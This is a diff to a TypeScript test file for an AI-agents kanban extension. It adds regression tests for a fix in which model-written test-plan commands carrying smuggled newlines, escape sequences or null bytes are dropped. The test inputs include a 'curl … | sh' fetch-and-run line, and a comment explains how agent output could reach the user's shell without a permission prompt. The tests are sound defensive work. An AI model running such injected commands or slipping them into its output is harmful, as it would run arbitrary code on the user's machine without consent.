@@ -1,7 +1,7 @@
 import { promises as fs } from 'node:fs'
 import * as os from 'node:os'
 import * as path from 'node:path'
-import { MetaStore, resolveEffort, resolveThinking } from '../meta.ts'
+import { CLEAR_TEST_PLAN, MetaStore, normaliseTestPlan, parseMeta, resolveEffort, resolveThinking, targetIsClean } from '../meta.ts'
 
 let fails = 0
 const ok = (c: boolean, m: string) => { if (!c) { console.log('FAIL:', m); fails++ } else console.log('  ok:', m) }
@@ -208,6 +208,53 @@ for (const m of MODELS) {
   ok(!/-\d{8}$/.test(m.id), `${m.label} uses the canonical undated id: ${m.id}`)
 }
 
+// --- a test-plan command may not carry a shell submit ------------------------
+//
+// `target` is MODEL-WRITTEN and a `command` link is handed to
+// `Terminal.sendText(target, false)`. The `false` means "do not APPEND a
+// newline" — but a newline inside the string is still a newline to the shell,
+// so everything before the last line executed the moment the user pressed the
+// button. `normaliseTestPlan` only did `.trim()`, which strips the OUTSIDE.
+//
+// It was the one link kind whose guard was prose: `url` is refused unless the
+// scheme is http(s) and `file` must resolve inside the worktree. And
+// `set_phase` is auto-allowed on the stated grounds that the board tools "only
+// write to our own sidecar" — so this was a sidecar write that became a shell
+// execution in the user's own unsandboxed shell, on one click, with no
+// permission prompt anywhere in the chain.
+for (const target of [
+  'npm test\ncurl -s http://x/y | sh',
+  'curl -s http://x/y | sh\n# npm test',
+  'npm test\rmalicious',
+  'npm test\u001b[2Kdisguised',
+  'npm test\u0000hidden',
+]) {
+  const plan = normaliseTestPlan({ summary: 's', links: [{ label: 'Run the tests', kind: 'command', target }] })
+  ok((plan?.links ?? []).length === 0,
+     `a command target carrying ${JSON.stringify(target.slice(0, 24))}… is DROPPED, not stored`)
+}
+// Dropped rather than truncated: the label is model-written too, so a rewritten
+// target would tell the user one thing and hand the shell another.
+{
+  const plan = normaliseTestPlan({
+    summary: 's',
+    links: [
+      { label: 'Bad', kind: 'command', target: 'a\nb' },
+      { label: 'Good', kind: 'command', target: 'npm run verify' },
+    ],
+  })
+  ok(plan?.links.length === 1 && plan.links[0]!.target === 'npm run verify',
+     'a clean command in the same plan still survives')
+}
+// Ordinary commands must not be caught by it — a false refusal here would make
+// the whole test-plan feature useless.
+for (const target of ['npm test', 'npm run verify -- --grep "a b"', './scripts/x.sh --flag=1', 'git diff main...HEAD']) {
+  const plan = normaliseTestPlan({ summary: 's', links: [{ label: 'x', kind: 'command', target }] })
+  ok(plan?.links.length === 1, `an ordinary command is untouched: ${target}`)
+}
+ok(targetIsClean('npm test') && !targetIsClean('npm\ntest'),
+   'the predicate is exported so the click path and the parse cannot disagree')
+
 // --- fields that must survive a reload, not just a write ---------------------
 //
 // `contextWindow` was written by every run and dropped by the reader, so the
@@ -224,6 +271,115 @@ await meta.update('s-reload', { contextWindow: 200_000, running: 1_700_000_000_0
 // drops it from the patch, so the old value would simply stay.
 await meta.update('s-reload', { running: 0 })
 ok(!(await new MetaStore(dir, root).get('s-reload')).running, 'and zero clears it, through a reload too')
+
+// `runtime` was the mirror image of the `contextWindow` bug and worse: it was
+// PARSED here from the day it was added and nothing anywhere ever wrote it. So
+// `store.runtimeOf()` returned undefined for every session, and every finished
+// Codex session's transcript, usage and meter were routed to the CLAUDE parser
+// — which reads a different store, in a different format, and comes back empty.
+await meta.update('s-codex', { runtime: 'codex' })
+{
+  const reloaded = await new MetaStore(dir, root).get('s-codex')
+  ok(reloaded.runtime === 'codex', `the agent program a session runs on survives a reload (${reloaded.runtime})`)
+}
+// Parsed, never cast: this file outlives the extension version that wrote it,
+// and it is read on the path that decides which store to open.
+await meta.update('s-bogus', { runtime: 'hologram' as never })
+ok((await new MetaStore(dir, root).get('s-bogus')).runtime === undefined,
+   'a runtime this build does not serve comes back absent, not as itself')
+
+// `fanout` is how many subtasks were APPROVED, and it exists because
+// `childrenOf()` counts only the ones that already have a card. A subtask held
+// behind maxConcurrentAgents has no sidecar entry at all — so the roll-up saw
+// 2 of a 4-way split, found both settled, and told the user "All 2 subtasks are
+// ready for you to test" over two agents that had never started.
+await meta.update('s-parent', { fanout: 4 })
+{
+  const reloaded = await new MetaStore(dir, root).get('s-parent')
+  ok(reloaded.fanout === 4, `the approved fan-out survives a reload (${reloaded.fanout})`)
+}
+for (const bad of [0, -1, 'four', null, Number.NaN]) {
+  await meta.update('s-bad-fanout', { fanout: bad as never })
+  ok((await new MetaStore(dir, root).get('s-bad-fanout')).fanout === undefined,
+     `a fan-out of ${JSON.stringify(bad) ?? 'null'} comes back absent rather than blocking every roll-up forever`)
+}
+
+// --- a test plan has to be retractable --------------------------------------
+//
+// `stripUndefined()` drops `undefined` from a patch, which is exactly why
+// `worktree` clears with `''` and `running` with `0`. `testPlan` had the same
+// need and no sentinel, so `patch(id, { testPlan: undefined })` was a no-op and
+// `normaliseTestPlan` refuses to manufacture an empty plan — an agent
+// explicitly retracting a plan was ignored. A plan recorded once outlived the
+// work it described forever, and the panel could say "here is how to test this"
+// but never "that is out of date".
+{
+  const planDir = await fs.mkdtemp(path.join(os.tmpdir(), 'ck-plan-'))
+  const m = new MetaStore(planDir, root)
+  await m.update('p1', { testPlan: normaliseTestPlan({ summary: 'run it', steps: ['npm test'] }) })
+  ok((await m.get('p1')).testPlan?.summary === 'run it', 'a test plan is recorded')
+  // The way that does NOT work, and must not silently look like it did.
+  await m.update('p1', { testPlan: undefined })
+  ok((await m.get('p1')).testPlan?.summary === 'run it',
+     'undefined still cannot clear it — a patch drops undefined, which is the whole reason for a sentinel')
+  await m.update('p1', { testPlan: CLEAR_TEST_PLAN })
+  ok((await m.get('p1')).testPlan === undefined, 'the sentinel clears it')
+  ok((await new MetaStore(planDir, root).get('p1')).testPlan === undefined,
+     'and it stays cleared through a reload — the sentinel never becomes a stored value')
+  await fs.rm(planDir, { recursive: true, force: true })
+}
+
+// --- two writes racing a COLD store -----------------------------------------
+//
+// `all()` guarded on `this.cache`, which is assigned only after a readFile and
+// a JSON.parse. Two callers arriving in that window each built their own map
+// and the second assignment replaced the first — so `update()` could mutate a
+// map that was then thrown away, `flush()` serialised `this.cache` instead, and
+// the write vanished. `update()` still RESOLVED WITH THE NEW VALUE, so the
+// caller was told it had been saved. That concurrency is reachable: `list()`
+// runs `getAll()` inside a `Promise.all`, and `launch()` calls `get()` and
+// `patch()` while the first repaint is in flight.
+{
+  const raceDir = await fs.mkdtemp(path.join(os.tmpdir(), 'ck-race-'))
+  const cold = new MetaStore(raceDir, root)
+  // Both issued before either can have resolved: a genuinely cold store.
+  await Promise.all([
+    cold.update('race-a', { phase: 'implementing' }),
+    cold.update('race-b', { phase: 'validating' }),
+    cold.update('race-c', { tags: ['x'] }),
+  ])
+  const reread = await new MetaStore(raceDir, root).getAll()
+  ok(reread['race-a']?.phase === 'implementing',
+     `the first concurrent write survives to disk (${reread['race-a']?.phase})`)
+  ok(reread['race-b']?.phase === 'validating',
+     `and so does the second (${reread['race-b']?.phase})`)
+  ok(reread['race-c']?.tags.join() === 'x',
+     `and the third (${JSON.stringify(reread['race-c']?.tags)})`)
+  await fs.rm(raceDir, { recursive: true, force: true })
+}
+
+// --- one parser, for our file and for a previous install's ------------------
+//
+// `mergePreviousInstalls()` spread a previous install's raw JSON with
+// `...(v as SessionMeta)`, twelve lines below a comment explaining that parsing
+// here is load-bearing. Those entries are written back into OUR file and served
+// to `store.list()`, whose consumers assume the parsed shape.
+{
+  ok(parseMeta({ phase: 'implementing', archived: 'no', running: '1700000000000', runtime: 'gemini', pinned: 'yes' })?.archived === false,
+     'a non-boolean `archived` comes back as a boolean')
+  const bad = parseMeta({ phase: 'x', running: '1700000000000', contextWindow: '1M', runtime: 'gemini', pinned: 'yes', testPlan: { steps: 3 } })
+  ok(bad?.running === undefined, `a string \`running\` is dropped, not handed to Date.now() arithmetic (${String(bad?.running)})`)
+  ok(bad?.contextWindow === undefined, `and a string window is dropped, not used as a meter denominator (${String(bad?.contextWindow)})`)
+  ok(bad?.runtime === undefined, `and a runtime this build cannot serve is dropped (${String(bad?.runtime)})`)
+  ok(bad?.pinned === false, 'and `pinned` — the board\'s primary sort key — can only ever be a boolean')
+  ok(bad?.testPlan === undefined, 'and a malformed test plan never reaches the webview')
+  ok(parseMeta(null) === undefined && parseMeta('x') === undefined && parseMeta(42) === undefined,
+     'a corrupt entry is skipped rather than becoming a card in the default column')
+  // An effort or thinking value from an older build must not reach the picker.
+  ok(parseMeta({ phase: 'x', effort: 'ultra' })?.effort === undefined, 'an unknown effort level is dropped')
+  ok(parseMeta({ phase: 'x', effort: 'xhigh' })?.effort === 'xhigh', 'while a real one survives')
+  ok(parseMeta({ phase: 'x', thinking: 'sometimes' })?.thinking === undefined, 'and an unknown thinking mode is dropped')
+}
 
 // --- surviving the extension changing its own identity -----------------------
 //
@@ -244,12 +400,36 @@ ok(!(await new MetaStore(dir, root).get('s-reload')).running, 'and zero clears i
   await fs.writeFile(path.join(old1, file), JSON.stringify({
     s1: { phase: 'complete', tags: ['done'], archived: false, pinned: false, activity: [] },
     s2: { phase: 'validating', tags: [], archived: false, pinned: false, activity: [] },
+    // An entry from a build whose shape this one does not serve. The recovery
+    // path used to SPREAD these raw, so every one of these values reached
+    // `store.list()` and the webview as-is: `archived` used as a boolean,
+    // `running` with `Date.now() -` done to it, `runtime` deciding which
+    // transcript store to open, `pinned` as the board's primary sort key, and
+    // a test plan that never passed `normaliseTestPlan`. And they were written
+    // back into OUR file, so the corruption outlived the old install.
+    s3: {
+      phase: 'implementing', tags: ['ok'], activity: [],
+      archived: 'no', pinned: 'yes', running: '1700000000000',
+      contextWindow: '1M', runtime: 'gemini', effort: 'ultra',
+      testPlan: { steps: 3 },
+    },
   }))
 
   const renamed = new MetaStore(path.join(gs, 'smile1294.agents-kanban'), ws)
   ok((await renamed.get('s1')).phase === 'complete', 'a renamed extension recovers the phase it recorded before')
   ok((await renamed.get('s2')).phase === 'validating', 'for every session, not just the first')
   ok((await renamed.get('s1')).tags.join(',') === 'done', 'and the tags with it')
+
+  // The adopted entry goes through the SAME parser as our own file.
+  const s3 = await renamed.get('s3')
+  ok(s3.phase === 'implementing', 'a recovered entry keeps the phase it had')
+  ok(s3.archived === false, `and its \`archived\` is a boolean whatever was stored (${JSON.stringify(s3.archived)})`)
+  ok(s3.pinned === false, `and so is \`pinned\`, the board's primary sort key (${JSON.stringify(s3.pinned)})`)
+  ok(s3.running === undefined, `a string \`running\` never reaches Date.now() arithmetic (${JSON.stringify(s3.running)})`)
+  ok(s3.contextWindow === undefined, `nor a string window the meter would divide by (${JSON.stringify(s3.contextWindow)})`)
+  ok(s3.runtime === undefined, `nor a runtime that would route the transcript reader nowhere (${JSON.stringify(s3.runtime)})`)
+  ok(s3.effort === undefined, 'nor an effort level the picker has never heard of')
+  ok(s3.testPlan === undefined, 'and a malformed test plan never reaches the webview')
 
   // Recovered once and written through, so the next launch has its own copy
   // and does not depend on the old install still being on disk.
